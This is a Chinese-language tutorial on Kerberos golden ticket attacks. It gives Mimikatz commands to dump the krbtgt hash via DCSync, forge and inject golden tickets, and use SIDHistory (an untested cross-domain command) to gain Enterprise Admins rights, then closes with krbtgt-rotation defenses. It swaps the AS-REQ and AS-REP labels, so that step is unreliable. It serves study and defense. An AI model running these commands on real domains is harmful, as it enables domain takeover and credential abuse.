# Kerberos黄金票据及和SIDHistory

## 讲在前面：

此篇文章介绍了黄金票据的基础用法以及会介绍根林-多域环境下黄金票据利用SIDHistory进行权限提升的操作。当然这些内容都是笔者在国内外优秀研究员的文章基础上做的一次小总结，有不全之初请斧正。

参考文章：

[https://adsecurity.org/?p=1640](https://adsecurity.org/?p=1640)

[https://www.anquanke.com/post/id/172900?display=mobile&platform=iOS](https://www.anquanke.com/post/id/172900?display=mobile&platform=iOS)

## 黄金票据-Golden Tickets

在对于Kerberos协议的解释已经在之前的不同文章里做了简单介绍，笔者节约篇幅在这不做赘述。黄金票据利用的是Kerberos协议中第一二步骤，利用krbtgt用户的hash直接生成TGT票据，从而直接跳过了一二步直接进行第三步开始请求TGS。可以见下图：

标红的就是缺失的1，2步骤

> 1. AS-REP：客户端向KDC中心发起验证请求，请求内容内容为客户端Hash加密的时间戳等数据
> 2. AS-REQ：KDC响应请求，使用以存储的客户端Hash解密AS\_REP数据包，如果验证成功，那么就返回使用krbtgt加密的TGT票据，TGT内包含PAC，PAC包含客户端所在的组，sid等

![](https://img-blog.csdnimg.cn/20201006200604483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

一个很有意思的事是黄金票据是一个在KDC看来合法的有效的票据，因为它是经过krbtgt账户加密/签名的。TGT仅用于向KDC证明自己已经被身份验证过了，但之后的PAC验证又是另外一回事了。

**生成黄金票据的要求：**

* 域名
* krbtgt的SID
* krbtgt账户的NTLM Hash
* 模拟用户名

## 获取必要信息

一旦攻击者具有了域管理员访问权限，就可以利用Minikatz提取krbtgt账户的密码hash,例如下面两个命令

```text
lsadump::dcsync /domain:pingpig.com /user:krbtgt
```

![](https://img-blog.csdnimg.cn/20201006201741852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

```text
sekurlsa::krbtgt
```

![](https://img-blog.csdnimg.cn/20201006201950531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

## 制作票据

注意：因为是在实验环境需要做如下两个操作保证实验性，实际渗透中请勿如此操作，本文仅作研究参考，不做为实际渗透所用。

* 清除内存票据：kerberos::purge
* 查看内存票据：kerberos::list

#### 直接注入：

```text
kerberos::golden /domain:pig.com /sid:S-1-5-21-3160116630-2225903390-3717321821-502 /aes256:39d82d8af9a1652267f2bf2b5c33cef819a9816b5e895e47014266f6d5405737 /user:piggg /ptt
```

#### 亦或者如下，注意去掉krbtgt的SID后面的RID

```text
kerberos::golden /admin:administrator /domain:test.org /sid:S-1-5-21-1205411304-435158765-2397915156 /krbtgt:1b88f3b0344d2d9c4aec012ade454776 /ptt
```

#### 生成票据文件，而后导入：

**生成文件：**

```text
kerberos::golden /domain:pig.com /sid:S-1-5-21-3160116630-2225903390-3717321821-502 /aes256:39d82d8af9a1652267f2bf2b5c33cef819a9816b5e895e47014266f6d5405737 /user:piggg /ticket:gold.kirbi
```

**导入票据：**

```text
kerberos::ptt c:\users\piggg\desktop\gold.kirbi /use
```

#### [在linux中使用](https://zhuanlan.zhihu.com/p/104464509)

## 遇到的问题

上一个实验实在单林单域环境下进行操作，Enterprise Admins组就在实验的域控中，但实际企业中可能会有多个林多个域环境，Enterprise Admins组只存在于根域的域控制器上。那么上面的生成的票据就只能被限制在所处域环境中，无法向上（父域）访问。**在一个多域AD森林中，如果创建的Golden Ticket的域不包含Enterprise Admins组，则Golden Ticket不会向林中的其他域提供管理权限。在单个域Active Directory林中，由于Enterprise Admins组驻留在此域中，这时创建Golden Ticket不存在局限性。**

除非在创建黄金票据的域包含Enterprise Admins组，否则黄金票据不能跨域信任使用，。一般的黄金票据权限范围仅限于其创建的子域

黄金票据+SIDHistory对此可以绕过

Mimikatz目前的版本已经支持可以直接这样利用

```text
kerberos::golden /admin:administrator /domain:new.test.org /sid:S-1-5-21-1205411304-435158765-2397915156 /sids:S-1-5-21-1205411304-435158765-2397915156-519 /krbtgt:1b88f3b0344d2d9c4aec012ade454776 /startoffset:0 /endin:600 /ptt
```

笔者在此处还未做实验：

![](https://img-blog.csdnimg.cn/2020100620381570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

## 防御：

1.限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。

2. 禁用KRBTGT帐户，并保存当前的密码以及以前的密码

3.建议定期更改KRBTGT密码。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。

4.一旦发现攻击者获得了KRBTGT帐号密码哈希的访问权限，快速更改KRBTGT密码两次，

